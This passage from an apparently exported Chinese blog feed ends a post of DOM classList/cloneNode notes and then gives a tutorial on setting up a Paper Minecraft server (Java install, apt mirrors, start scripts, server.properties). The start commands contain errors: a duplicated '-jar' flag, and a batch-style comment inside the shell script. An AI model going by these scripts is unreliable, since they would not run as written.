‘class2’)</td><td>移除元素中一个或多个类名。当相应的类名不存在也不会报错</td></tr><tr><td>toggle(‘class’)</td><td>在元素中切换类名。如果这个值已存在，则移除它，否则添加它</td></tr></tbody></table><p>例如，有几个 CSS 样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.rightside-show</span>&#123;</span><br><span class="line">  <span class="comment">/*原有样式，代码略*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rS-1</span>&#123;</span><br><span class="line">  <span class="comment">/*相关样式，代码略*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rS-2</span>&#123;</span><br><span class="line">  <span class="comment">/*相关样式，代码略*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rS-3</span>&#123;</span><br><span class="line">  <span class="comment">/*相关样式，代码略*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在页面中添加以下 js 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rightsideShow = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.rightside-show&#x27;</span>);</span><br><span class="line"></span><br><span class="line">rightsideShow.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;rS-1&#x27;</span>);</span><br><span class="line">rightsideShow.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;rS-2&#x27;</span>);</span><br><span class="line">rightsideShow.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;rightside-show&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么这部分类名将会变成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;rightside&quot;</span> <span class="attr">class</span>=<span class="string">&quot;rS-1 rS-2&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--其余内容，代码略--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="复制元素">复制元素</h2><details class="toggle" ><summary class="toggle-button" style="">Node.cloneNode</summary><div class="toggle-content"><p>这个方法可以返回调用该方法的节点的一个副本。使用方法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dupNode = node.<span class="title function_">cloneNode</span>(deep);</span><br></pre></td></tr></table></figure><ul><li>node 将要被克隆的节点</li><li>dupNode 克隆生成的副本节点</li><li>deep （可选）是否采用深度克隆，如果为 true，则该节点的所有后代节点也都会被克隆，如果为 false，则只克隆该节点本身。</li></ul></div></details><p>按照开头那个例子，如果想把<code>简繁转换</code>按钮原样复制到<code>设置</code>按钮上方，则可以使用这样的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> translateLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;translateLink&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rightsideConfig= <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rightside-config&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 克隆元素</span></span><br><span class="line"><span class="keyword">const</span> translateLinkCloned = translateLink.<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将克隆的元素插入到 rightsideConfig 元素之前</span></span><br><span class="line">rightsideConfig.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(translateLinkCloned, rightsideConfig);</span><br></pre></td></tr></table></figure><h2 id="未完待续">未完待续</h2><p>参考资料来源：</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/" rel="external nofollow noreferrer">https://developer.mozilla.org/zh-CN/</a></p></blockquote><p><s>暂时写到这里，将来可能会添加新内容</s></p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建 Minecraft 服务器</title>
      <link href="/posts/1628586937/"/>
      <url>/posts/1628586937/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>曾经我玩 MC 都是单机的，一年多后才与好友玩起联机；游玩服务器则更是等到某易代理国版之后。</p><p>与好友联机是一件很有趣的事。不过众所周知这需要“房主”保持在线，而且大多需要直接在游戏里控制。</p><p>数据确实保持在自己手里了，但要与好友在同一局域网里，或配置内网穿透。嗯……稳定性？每次游玩都要我保持在线……曾经这确实不是什么问题，后来大家时间都很紧了，同时在线是几乎不可能的事。我需要一个不受“房主”限制的能实现“联机游玩”的方案……</p><p>譬如，搭建 MC 服务器？</p><h2 id="准备工作">准备工作</h2><p>明确自己开设的服务器的用途，满足自己短时间联机的需求，或是想做大做强，对服务器性能的要求等等。根据需求选择合适的服务器设备。</p><p>（如果你愿意，甚至可以使用自己的电脑乃至手机作为服务器。）</p><p>一般情况下，你需要做的准备有：</p><ul><li>服务器（无论是个人电脑还是购买的云服务器）</li><li>浏览器（建议使用 Chromium 系，不建议使用 IE 等古老浏览器）</li><li>流畅的网络（如果不流畅请自备加速优化工具）</li><li>懂得如何使用搜索引擎、如何阅读官方文档</li></ul><p>说明：</p><ul><li>本文记录了<font color="red"><strong>Java 版</strong></font>MC 服务器的搭建过程以及域名配置，请根据需要选择性阅读；</li><li>文中可能存在描述简单、不便书写的内容，请悉知；</li><li>请学会阅读官方文档、使用搜索引擎等必备技能。</li><li>MC 服务器运行目录将以<code>【mcserver】</code>代替，服务端核心名称为<code>server.jar</code>，域名以<code>example.com</code>及其变式为例，IP 以<code>255.255.255.255</code>为例，端口以<code>25565</code>为例。</li><li>本教程内实例使用<code>Paper1.20.X</code>，且仅为基础配置，不含插件、MOD（补充：Paper 核心不支持 MOD）等教程。</li></ul><h2 id="服务器配置">服务器配置</h2><h3 id="安装-Java">安装 Java</h3><p>可能用到的文档：<br><a href="https://adoptium.net/zh-CN/" rel="external nofollow noreferrer">https://adoptium.net/zh-CN/</a><br><a href="https://adoptium.net/installation/linux/" rel="external nofollow noreferrer">https://adoptium.net/installation/linux/</a><br><a href="https://www.java.com/zh-CN/download/" rel="external nofollow noreferrer">https://www.java.com/zh-CN/download/</a></p><p>提醒：</p><ul><li>JDK 包含了 JRE，一般安装前者即可。</li></ul><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">Windows</button><button type="button" class="tab">Linux</button><button type="button" class="tab">其他</button></div><div class="tab-contents"><div class="tab-item-content active"><p>前往 Java 官网下载：<a href="https://www.java.com/zh-CN/download/" rel="external nofollow noreferrer">https://www.java.com/zh-CN/download/</a></p><p>我安装的是 Adoptium 的 OpenJDK，它的前身是著名的 AdoptOpenJDK，更新到 jdk16 后被移交给 Eclipse 基金会并改名为 Adoptium Eclipse Temurin</p><p><a href="https://adoptium.net/zh-CN/" rel="external nofollow noreferrer">https://adoptium.net/zh-CN/</a></p><div class="note warning flat"><p>如果你准备开设的 MC 服务器版本低于或等于 1.16.5，可以安装 Java8。1.17.X 需要 Java16，往后版本甚至需要 Java17，此时最好使用 Java 最新版本</p></div><p>Windows 系统下安装环境难度不大。安装后打开 Win+R 输入 CMD 打开命令提示符，输入命令查看安装成果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><p>【此处以 Ubuntu20.04 系统操作为例】</p><p>【建议略微了解下 vim 编辑器的基本操作，它与你平常使用的编辑器不太一样，但掌握的话使用起来非常方便】</p><p>【此处建议结合本节开头的链接文档阅读】</p><p>由于国内网络众所周知的原因，使用 Ubuntu 默认软件源速度很慢，故建议配置国内镜像。</p><p>登入系统后，输入命令打开软件源配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>建议备份该文件以防万一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p>将文件内的东西清空后替换为如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">#添加清华源</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">## deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">## deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">## deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">## deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span><br></pre></td></tr></table></figure><p>保存并退出，然后执行命令更新镜像源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure><p>之后安装 MC 服务器所需的 Java 环境。执行以下命令搜索：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search openjdk</span><br></pre></td></tr></table></figure><p>按照你的需求选择合适的版本，输入：【请根据自己的需求适当替换命令中的内容】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-17-jdk -y</span><br></pre></td></tr></table></figure><p>安装完成后执行命令确认安装成果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java --version</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><blockquote><p>云服务器</p></blockquote><p>一般情况下，至少大厂的云服务器有些有预制 MC 服务器镜像，直接使用即可。若无，可在服务器的操作系统中自行配置。Winserver 和 Ubuntu/CentOS 大致同前面的 Windows 和 Linux</p><blockquote><p>闲置安卓手机</p></blockquote><p>由于我没有进行这方面的实践探索，故此处请自行百度（逃。）。</p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><h3 id="选择-MC-服务端">选择 MC 服务端</h3><p>下载适合你需求的服务端。可以前往此处寻找：</p><p><a href="https://mcversions.net/" rel="external nofollow noreferrer">https://mcversions.net/</a><br><a href="https://www.minecraft.net/download/server" rel="external nofollow noreferrer">https://www.minecraft.net/download/server</a></p><p>MC 服务端核心种类比较多，此处列举比较有名的几个【仅为部分，且不包含 PE 版服务器核心】：</p><table><thead><tr><th>服务端</th><th>简介与属性</th><th>下载</th><th>备注</th></tr></thead><tbody><tr><td>Vanilla</td><td>所有核心的源头，最简单最完善的核心。不支持除了原生 Minecraft 外的任何特性内容，不过在安装 Forge/Fabric 之类的插件后可以安装 mod</td><td><a href="https://www.minecraft.net/" rel="external nofollow noreferrer">https://www.minecraft.net/</a></td><td>无</td></tr><tr><td>Bukkit</td><td>基于 Vanilla 二次开发，给官服加入插件机制。由于 Minecraft EULA 的内容变更与项目归属等原因，该核心在 2014 年 8 月 21 日停止开发</td><td><a href="https://www.getbukkit.org/" rel="external nofollow noreferrer">https://www.getbukkit.org/</a></td><td>无</td></tr><tr><td>Spigot</td><td>由 SpigotMC 团队开发，可以看作 CraftBukkit 的延续，在 Bukkit 的基础上支持其自己的 Spigot 插件，优化很好，使用稳定</td><td><a href="https://www.spigotmc.org/" rel="external nofollow noreferrer">https://www.spigotmc.org/</a></td><td>支持插件，不支持 MOD</td></tr><tr><td>Paper</td><td>基于 Spigot 添加了很多有效的优化和更多个性化配置，稳定性和性能好，更新迅速，对服务器性能要求低，但削弱很多官方特性</td><td><a href="https://papermc.io/" rel="external nofollow noreferrer">https://papermc.io/</a></td><td>支持插件，不支持 MOD</td></tr><tr><td>VanillaForge</td><td>基于官方原版的、可安装支持 ForgeAPI 的模组的服务端，稳定性较好，易于更新，性能较差</td><td><a href="https://www.curseforge.com/minecraft/modpacks/vanilla-forge" rel="external nofollow noreferrer">https://www.curseforge.com/minecraft/modpacks/vanilla-forge</a></td><td>无</td></tr><tr><td>CatServer</td><td>基于 Spigot，支持大部分 MOD 和插件同时稳定运行，但仅支持 1.12.2</td><td><a href="https://catmc.org/" rel="external nofollow noreferrer">https://catmc.org/</a></td><td>无</td></tr></tbody></table><p>对于 Windows 系统而言，可下载后将其复制粘贴到你准备用来运行服务器的文件夹中；对 Linux 系统而言，如果没有图像界面，可以使用命令完成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> mcserver <span class="comment">## mcserver 可改为其他名称</span></span><br><span class="line"><span class="built_in">cd</span> mcserver <span class="comment">## mcserver 可改为其他名称</span></span><br><span class="line">wget https://api.papermc.io/v2/projects/paper/versions/1.20.4/builds/391/downloads/paper-1.20.4-391.jar <span class="comment">## wget 后面的链接请根据自己需求修改。在核心的官网找到下载地址并复制下载链接即可。</span></span><br></pre></td></tr></table></figure><h3 id="初始化文件">初始化文件</h3><p>为方便启动，可在<code>【mcserver】</code>目录下（建议与核心在同一层目录）创建文件并编写启动命令。</p><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">Windows</button><button type="button" class="tab">Linux</button></div><div class="tab-contents"><div class="tab-item-content active"><p>新建 start.bat 文件并将以下内容输入保存：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off </span><br><span class="line">:: 关闭命令回显</span><br><span class="line"></span><br><span class="line"><span class="built_in">path</span>=<span class="variable">%PATH%</span>;【Java 安装目录】 </span><br><span class="line">:: 检测系统设置里的环境变量；若未检测到，则使用后面的地址（连同括号一并替换为你的 Java 安装目录，到/bin 目录为止）</span><br><span class="line"></span><br><span class="line">java -jar -Xms1000m -Xmx2000m -jar server.jar nogui</span><br><span class="line">:: 这段命令的含义为：调用 Java，以最小内存 <span class="number">1000</span>M、最大内存 <span class="number">2000</span>M 启动 server.jar，不显示图形界面</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span> </span><br><span class="line">:: 命令结束后不停顿</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><p>新建 <a href="http://start.sh" rel="external nofollow noreferrer">start.sh</a> 文件并将以下内容输入保存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">java -jar -Xms1024M -Xmx4096M -jar server.jar nogui</span><br><span class="line">:: 将服务端最低内存设置为 1024M，最大内存设置为 4096M，不需要图形界面。</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><p>完成后执行脚本，会自动下载所需文件。第一次运行有很大概率会很快终止。此时需要打开<code>【mcserver】</code>目录下生成的<code>eula.txt</code>，将其中的<code>eula=false</code>改为<code>eula=true</code>并保存（代表接受 Minecraft EULA），之后重新运行脚本即可。</p><h3 id="配置参数">配置参数</h3><h4 id="配置文件">配置文件</h4><p><code>server.properties</code>会在服务端第一次运行时自动生成。它是 Minecraft 服务器的主配置文件，其中行之间的顺序可以打乱，但文件结构不能改变。</p><p>以<code>#</code>开头的行为注释，不会对游戏造成影响。修改之后，必须重新启动服务端或在控制台使用<code>/reload</code>命令重新加载才能生效。</p><p>该文件大致含有如下内容【不同核心、不同版本此处内容会有出入】：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#Minecraft server properties</span><br><span class="line">#Sat Oct 28 01:01:12 CDT 2023</span><br><span class="line">enable-jmx-monitoring=false</span><br><span class="line">rcon.port=25565</span><br><span class="line">level-seed=</span><br><span class="line">gamemode=survival</span><br><span class="line">enable-command-block=false</span><br><span class="line">enable-query=false</span><br><span class="line">generator-settings=&#123;&#125;</span><br><span class="line">enforce-secure-profile=true</span><br><span class="line">level-name=world</span><br><span class="line">motd=A Minecraft Server</span><br><span class="line">query.port=25565</span><br><span class="line">pvp=true</span><br><span class="line">generate-structures=true</span><br><span class="line">max-chained-neighbor-updates=1000000</span><br><span class="line">difficulty=easy</span><br><span class="line">network-compression-threshold=256</span><br><span class="line">max-tick-time=60000</span><br><span class="line">require-resource-pack=false</span><br><span class="line">use-native-transport=true</span><br><span class="line">max-players=20</span><br><span class="line">online-mode=true</span><br><span class="line">enable-status=true</span><br><span class="line">allow-flight=false</span><br><span class="line">initial-disabled-packs=</span><br><span class="line">broadcast-rcon-to-ops=true</span><br><span class="line">view-distance=10</span><br><span class="line">server-ip=</span><br><span class="line">resource-pack-prompt=</span><br><span class="line">allow-nether=true</span><br><span class="line">server-port=25565</span><br><span class="line">enable-rcon=false</span><br><span class="line">sync-chunk-writes=true</span><br><span class="line">op-permission-level=4</span><br><span class="line">prevent-proxy-connections=false</span><br><span class="line">hide-online-players=false</span><br><span class="line">resource-pack=</span><br><span class="line">entity-broadcast-range-percentage=100</span><br><span class="line">simulation-distance=10</span><br><span class="line">rcon.password=</span><br><span class="line">player-idle-timeout=0</span><br><span class="line">debug=false</span><br><span class="line">force-gamemode=false</span><br><span class="line">rate-limit=0</span><br><span class="line">hardcore=false</span><br><span class="line">white-list=false</span><br><span class="line">broadcast-console-to-ops=true</span><br><span class="line">spawn-npcs=true</span><br><span class="line">spawn-animals=true</span><br><span class="line">log-ips=true</span><br><span class="line">function-permission-level=2</span><br><span class="line">initial-enabled-packs=vanilla</span><br><span class="line">level-type=minecraft\:normal</span><br><span class="line">text-filtering-config=</span><br><span class="line">spawn-monsters=true</span><br><span class="line">enforce-whitelist=false</span><br><span class="line">spawn-protection=16</span><br><span class="line">resource-pack-sha1=</span><br><span class="line">max-world-size=29999984</span><br><span class="line"></span><br><span class="line">## The only server software you should be using is Paper, found here https://papermc.io/</span><br><span class="line">## tacos are tasty. burritos are also tasty. there is no need for war.</span><br></pre></td></tr></table></figure><p>对照：<br><a href="https://minecraft.fandom.com/zh/wiki/Server.properties" rel="external nofollow noreferrer">https://minecraft.fandom.com/zh/wiki/Server.properties</a></p><details class="toggle" ><summary class="toggle-button" style="">对照内容【不建议阅读此处】</summary><div class="toggle-content"><p><a href="https://minecraft.fandom.com/zh/wiki/Server.properties" rel="external nofollow noreferrer">https://minecraft.fandom.com/zh/wiki/Server.properties</a></p><p><font color="red">请直接阅读原文。</font>这里的内容仅用于打不开上面链接时临时查询。</p><table><thead><tr><th>属性</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>allow-flight</td><td>布尔值</td><td>false</td><td>允许玩家在安装添加飞行功能的 mod 前提下在生存模式下飞行。</td></tr><tr><td>允许飞行可能会使恶意破坏者更加常见，因为此设定会使他们更容易达成目的。在创造模式下无作用。</td><td></td><td></td><td></td></tr><tr><td>false - 不允许飞行。悬空超过 5 秒的玩家会被踢出服务器。</td><td></td><td></td><td></td></tr><tr><td>true - 允许飞行。玩家得以使用任何能飞行的 mod 飞行。</td><td></td><td></td><td></td></tr><tr><td>allow-nether</td><td>布尔值</td><td>true</td><td>允许玩家进入下界。</td></tr><tr><td>false - 下界传送门不会生效。</td><td></td><td></td><td></td></tr><tr><td>true - 玩家可以通过下界传送门前往下界。</td><td></td><td></td><td></td></tr><tr><td>broadcast-console-to-ops</td><td>布尔值</td><td>true</td><td>向所有在线 OP 发送所执行命令的输出。</td></tr><tr><td>broadcast-rcon-to-ops</td><td>布尔值</td><td>true</td><td>向所有在线 OP 发送通过 RCON 执行的命令的输</td></tr><tr><td>difficulty</td><td>字符串</td><td>easy</td><td>定义服务器的游戏难度（例如生物对玩家造成的伤害，饥饿和中毒对玩家的影响方式等）。如果设置了旧的数字 ID，则会自动转化为英文的难度名称。</td></tr><tr><td>peaceful (0) - 和平</td><td></td><td></td><td></td></tr><tr><td>easy (1) - 简单</td><td></td><td></td><td></td></tr><tr><td>normal (2) - 普通</td><td></td><td></td><td></td></tr><tr><td>hard (3) - 困难</td><td></td><td></td><td></td></tr><tr><td>enable-command-block</td><td>布尔值</td><td>false</td><td>是否启用命令方块。</td></tr><tr><td>enable-jmx-monitoring</td><td>布尔值</td><td>false</td><td>暴露一个具有对象名 net.minecraft.server:type=Server 的 MBean 和两个属性 averageTickTime 和 tickTimes 用于暴露以毫秒为单位的 tick 时间。</td></tr><tr><td>为了启用 JRE 的 JMX，你需要添加在此处所述的一些 JVM 标志。</td><td></td><td></td><td></td></tr><tr><td>enable-query</td><td>布尔值</td><td>false</td><td>允许使用 GameSpy4 协议的服务器监听器。用于获取服务器信息。</td></tr><tr><td>enable-rcon</td><td>布尔值</td><td>false</td><td>是否允许远程访问服务器控制台。</td></tr><tr><td>由于 RCON 协议传输数据时没有加密，所以不建议把 RCON 暴露在互联网上。RCON 客户端和服务端交换的所有数据（包括 RCON 密码）都会泄露给正在监听此连接的人。</td><td></td><td></td><td></td></tr><tr><td>enable-status</td><td>布尔值</td><td>true</td><td>使服务器在服务器列表中看起来是“在线”的。</td></tr><tr><td>enforce-secure-profile</td><td>布尔值</td><td>true</td><td>要求玩家必须具有 Mojang 签名的公钥才能进入服务器。</td></tr><tr><td>true - 不具有 Mojang 签名的公钥的玩家不能进入服务器。</td><td></td><td></td><td></td></tr><tr><td>false - 不具有 Mojang 签名的公钥的玩家也可进入服务器。</td><td></td><td></td><td></td></tr><tr><td>enforce-whitelist</td><td>布尔值</td><td>false</td><td>在服务器上强制执行白名单。</td></tr><tr><td>当启用后，不在白名单（前提是启用）中的用户将在服务器重新加载白名单文件后从服务器踢出。</td><td></td><td></td><td></td></tr><tr><td>true - 不在白名单上的用户会被踢出。</td><td></td><td></td><td></td></tr><tr><td>false - 不在白名单上的在线用户不会被踢出。</td><td></td><td></td><td></td></tr><tr><td>entity-broadcast-range-percentage</td><td>整数（10-1000）</td><td>100</td><td>此选项控制实体需要距离玩家有多近才会将数据包发送给客户端。更高的数值意味着实体可以在更远的地方就被渲染，同时也可能提高增加延迟的概率。</td></tr><tr><td>这个值是以默认值的百分比来表示的。例如：将此值设为 50，表示将渲染正常情况下一半距离以内的生物。</td><td></td><td></td><td></td></tr><tr><td>此功能模仿了客户端视频设置中的功能，而不像客户端的渲染距离设置一样只能在服务器设置的限制下调整渲染距离。</td><td></td><td></td><td></td></tr><tr><td>force-gamemode</td><td>布尔值</td><td>false</td><td>强制玩家加入时为默认游戏模式。</td></tr><tr><td>false - 玩家将以退出前的游戏模式加入</td><td></td><td></td><td></td></tr><tr><td>true - 玩家总是以默认游戏模式加入</td><td></td><td></td><td></td></tr><tr><td>function-permission-level</td><td>整数（1-4）</td><td>2</td><td>设定函数的默认权限等级。</td></tr><tr><td>4 个等级的详情见 #op-permission-level。</td><td></td><td></td><td></td></tr><tr><td>gamemode</td><td>字符串</td><td>survival</td><td>定义默认游戏模式。</td></tr><tr><td>如果值是旧用的数字，会静默转换为对应游戏模式的英文名称。</td><td></td><td></td><td></td></tr><tr><td>survival (0) - 生存模式</td><td></td><td></td><td></td></tr><tr><td>creative (1) - 创造模式</td><td></td><td></td><td></td></tr><tr><td>adventure (2) - 冒险模式</td><td></td><td></td><td></td></tr><tr><td>spectator (3) - 旁观模式</td><td></td><td></td><td></td></tr><tr><td>generate-structures</td><td>布尔值</td><td>true</td><td>定义是否能生成结构（例如村庄）。</td></tr><tr><td>false - 新生成的区块中将不包含结构。</td><td></td><td></td><td></td></tr><tr><td>true - 新生成的区块中将包含结构。</td><td></td><td></td><td></td></tr><tr><td>注：由于地牢和沙漠水井在技术上属于地物，因而即使此项设为 false，其仍然会生成。</td><td></td><td></td><td></td></tr><tr><td>generator-settings</td><td>字符串</td><td>{}</td><td>本属性质用于自定义世界的生成。详见超平坦世界和自定义了解正确的设定及例子。</td></tr><tr><td>hardcore</td><td>布尔值</td><td>false</td><td>如果设为 true，服务器难度的设置会被忽略并且设为 hard（困难），玩家在死后会自动切换至旁观模式。</td></tr><tr><td>hide-online-players</td><td>布尔值</td><td>false</td><td>如果设为 true，服务端在响应客户端状态请求时不会返回在线玩家列表。</td></tr><tr><td>initial-disabled-packs</td><td>字符串</td><td>空白</td><td>需要在创建世界过程中禁用的数据包名称，以逗号分隔。</td></tr><tr><td>initial-enabled-packs</td><td>字符串</td><td>vanilla</td><td>需要在创建世界过程中启用的数据包名称，以逗号分隔。特别地，功能数据包必须在此指定才能生效。</td></tr><tr><td>level-name</td><td>字符串</td><td>world</td><td>“level-name”的值将作为世界名称及其文件夹名。你也可以把你已生成的世界存档复制过来，然后让这个值与那个文件夹的名字保持一致，服务器就可以载入该存档。</td></tr><tr><td>部分字符，例如 ’ （单引号）可能需要在前面加反斜杠号 \ 